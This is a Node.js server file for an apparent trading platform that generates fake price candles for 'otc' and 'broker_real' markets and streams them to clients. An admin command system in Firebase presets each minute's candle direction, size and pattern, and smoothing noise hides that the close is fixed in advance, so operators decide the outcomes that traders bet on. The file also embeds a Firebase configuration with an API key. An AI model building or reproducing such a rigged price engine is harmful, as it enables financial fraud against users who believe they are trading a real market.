// --- START: server.js (Future Scheduling & 10s Delay Engine V7) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 1000;
const TIMEFRAME = 60000;
const TICK_MS = 250;
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300;

const markets = {}; 
let adminCommands = {}; 

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// Listen for ALL Admin Commands globally
db.ref('admin/commands').on('value', (snapshot) => {
    adminCommands = snapshot.val() || {};
});

// 🔥 CORE LOGIC: CALCULATE TARGET BASED ON PREVIOUS CANDLE 🔥
function generateTargetCandle(timestamp, openPrice, cmd, prevCandle) {
    let isGreen = Math.random() > 0.5;
    let baseVol = openPrice * 0.00005;
    
    let prevBody = baseVol;
    let prevColor = 'UNKNOWN';
    if (prevCandle) {
        prevBody = Math.abs(prevCandle.close - prevCandle.open);
        if (prevBody < baseVol * 0.2) prevBody = baseVol; // Base limit
        prevColor = prevCandle.close >= prevCandle.open ? 'GREEN' : 'RED';
    }

    let body = baseVol * (0.8 + Math.random());
    let upWick = baseVol * Math.random();
    let dnWick = baseVol * Math.random();

    if (cmd) {
        const type = cmd.action;

        if (type.includes('UP')) isGreen = true;
        if (type.includes('DOWN')) isGreen = false;

        // MATH LOGIC (Based on User's Request)
        if (type.includes('INSIDE')) {
            body = prevBody * (0.50 + Math.random() * 0.25); // 50-75% of previous
            upWick = body * 0.2; dnWick = body * 0.2;
        } 
        else if (type.includes('BREAKOUT')) {
            body = prevBody * (1.25 + Math.random() * 0.50); // 125-175% of previous
            upWick = body * 0.3; dnWick = body * 0.3;
        } 
        else if (type.includes('2X')) {
            body = prevBody * (2.0 + Math.random() * 0.20); // 200-220% (Double Size)
            upWick = body * 0.5; dnWick = body * 0.5;
        } 
        else if (type === 'OPPOSITE_BREAKOUT') {
            isGreen = (prevColor === 'RED'); // Reverse color
            body = prevBody * (1.30 + Math.random() * 0.50); // Breakout
            upWick = body * 0.3; dnWick = body * 0.3;
        } 
        else if (type.startsWith('PATTERN_')) {
            if (type === 'PATTERN_DOJI') {
                body = baseVol * 0.1; upWick = baseVol * 3; dnWick = baseVol * 3;
                isGreen = Math.random() > 0.5;
            } else if (type === 'PATTERN_MARUBOZU_GREEN') {
                isGreen = true; body = prevBody * 1.5; upWick = 0; dnWick = 0;
            } else if (type === 'PATTERN_MARUBOZU_RED') {
                isGreen = false; body = prevBody * 1.5; upWick = 0; dnWick = 0;
            } else if (type === 'PATTERN_HAMMER') {
                isGreen = true; body = prevBody * 1.2; upWick = 0; dnWick = body * 3.0;
            } else if (type === 'PATTERN_SHOOTING_STAR') {
                isGreen = false; body = prevBody * 1.2; upWick = body * 3.0; dnWick = 0;
            }
        }
    }

    const close = isGreen ? openPrice + body : openPrice - body;
    const high = Math.max(openPrice, close) + upWick;
    const low = Math.min(openPrice, close) - dnWick;

    const target = { timestamp, open: roundPrice(openPrice), close: roundPrice(close), high: roundPrice(high), low: roundPrice(low) };

    let analyticsPayload = null;
    if (cmd && cmd.id) {
        analyticsPayload = {
            prevCandle: { open: prevCandle?.open || openPrice, close: prevCandle?.close || openPrice, color: prevColor, size: prevBody },
            targetCandle: { open: target.open, close: target.close, color: isGreen ? 'GREEN' : 'RED', size: body }
        };
    }

    return { target, analyticsPayload };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;
    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const { target } = generateTargetCandle(nowPeriod - (i * TIMEFRAME), currentPrice, null, null);
        candles.push(target);
        currentPrice = target.close;
    }

    markets[marketId] = {
        marketId,
        marketPath: path,
        history: candles,
        currentPrice: currentPrice,
        targetCandle: null,
        currentNoise: 0
    };
}

function ensureTargetCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    
    // When a new minute starts
    if (!marketData.targetCandle || marketData.targetCandle.timestamp !== currentPeriod) {
        
        let activeCmd = null;
        
        // Find if admin scheduled a command for this exact market and minute
        for (const cmdId in adminCommands) {
            const cmd = adminCommands[cmdId];
            if (cmd.marketId === marketData.marketId && cmd.targetTime === currentPeriod && cmd.status === 'Pending') {
                activeCmd = cmd;
                break;
            }
        }

        const { target, analyticsPayload } = generateTargetCandle(currentPeriod, lastCandle.close, activeCmd, lastCandle);
        
        marketData.targetCandle = target;
        marketData.currentNoise = 0; 
        
        // Execute the command in database immediately with results
        if (activeCmd && analyticsPayload) {
            console.log(`[EXECUTE] Market: ${marketData.marketId}, Action: ${activeCmd.action}`);
            db.ref(`admin/commands/${activeCmd.id}`).update({
                status: 'Executed',
                analytics: analyticsPayload
            });
        }
        
        const newCandle = { timestamp: currentPeriod, open: target.open, high: target.open, low: target.open, close: target.open };
        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        
        marketData.currentPrice = target.open;
    }
}

// 🔥 10s WAIT + 50s MOVE LOGIC 🔥
function updatePriceSmoothly(marketData, currentPeriod) {
    const target = marketData.targetCandle;
    if (!target) return;

    const liveCandle = marketData.history[marketData.history.length - 1];
    const timeElapsed = Date.now() - currentPeriod;
    
    let progress = 0;
    let noiseMaxAllowed = 0;

    // First 10 Seconds: Just hover around the open price (Simulating calculation)
    if (timeElapsed <= 10000) {
        progress = 0;
        noiseMaxAllowed = target.open * 0.00002; // Tiny noise
    } 
    // Next 50 Seconds: Move towards the target
    else {
        // Map 10,000ms - 60,000ms to 0.0 - 1.0 progress
        progress = Math.min((timeElapsed - 10000) / 50000, 1.0); 
        noiseMaxAllowed = Math.abs(target.close - target.open) * 0.15 * (1 - progress); 
    }

    const expectedBasePath = target.open + ((target.close - target.open) * progress);
    let tickDelta = (Math.random() - 0.5) * noiseMaxAllowed;
    
    marketData.currentNoise += tickDelta;

    if (Math.abs(marketData.currentNoise) > noiseMaxAllowed) {
        marketData.currentNoise *= 0.5;
    }

    let newPrice = expectedBasePath + marketData.currentNoise;

    // Hard lock at the last 2 seconds
    if (progress >= 0.98) {
        newPrice = target.close;
    }

    marketData.currentPrice = newPrice;

    liveCandle.close = roundPrice(newPrice);
    liveCandle.high = roundPrice(Math.max(liveCandle.high, liveCandle.close, target.open));
    liveCandle.low = roundPrice(Math.min(liveCandle.low, liveCandle.close, target.open));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach((marketId) => {
        const type = fbMarkets[marketId]?.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    const historyPayload = { type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) };
                    ws.send(JSON.stringify(historyPayload));
                }
            }
        } catch (_) {}
    });
});

let lastSyncMinute = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentMinute = Math.floor(now / 60000);

    for (const marketId in markets) {
        const marketData = markets[marketId];
        ensureTargetCandle(marketData, currentPeriod);
        updatePriceSmoothly(marketData, currentPeriod);
        broadcastCandle(marketId, marketData.history[marketData.history.length - 1]);
    }

    if (currentMinute > lastSyncMinute) {
        lastSyncMinute = currentMinute;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            const lastC = m.history[m.history.length-1];
            if (lastC) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: lastC.close, timestamp: lastC.timestamp };
            }
        }
        db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('Future Target Engine V7 Running'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));